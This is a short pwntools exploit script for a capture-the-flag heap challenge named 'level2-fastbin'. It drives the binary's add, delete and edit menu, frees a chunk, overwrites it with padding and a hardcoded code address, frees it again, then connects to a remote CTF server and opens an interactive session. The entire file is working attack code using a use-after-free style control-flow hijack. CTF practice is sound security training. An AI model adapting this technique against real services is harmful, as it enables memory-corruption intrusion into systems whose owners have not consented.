#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
#import os
code = ELF('./level2-fastbin', checksec=False)
context.arch = code.arch
context.log_level = 'debug'
#gadget = lambda x: next(code.search(asm(x, os='linux', arch=code.arch)))
#context.terminal = ['tmux', 'new-window']
#debug = lambda : gdb.attach(r) #, gdbscript='b *{:#x}'.format(code.address+0x10EE))

def add(data):
    r.sendlineafter('>> ', '1')
    r.sendlineafter(': ', data)
def dele(idx):
    r.sendlineafter('>> ', '3')
    r.sendlineafter(':', str(idx))
def edit(data):
    r.sendlineafter('>> ', '4')
    r.sendlineafter(':', data)
def exploit(r):
    r.sendlineafter(':', 'qwe')
    add('1') # 0
    #add('2') # 1
    dele(0)
    sh='a'*48+p64(0x4008B6)
    edit(sh)
    dele(0)


r=remote("pwn.sixstars.team",22502)
exploit(r)
r.interactive()

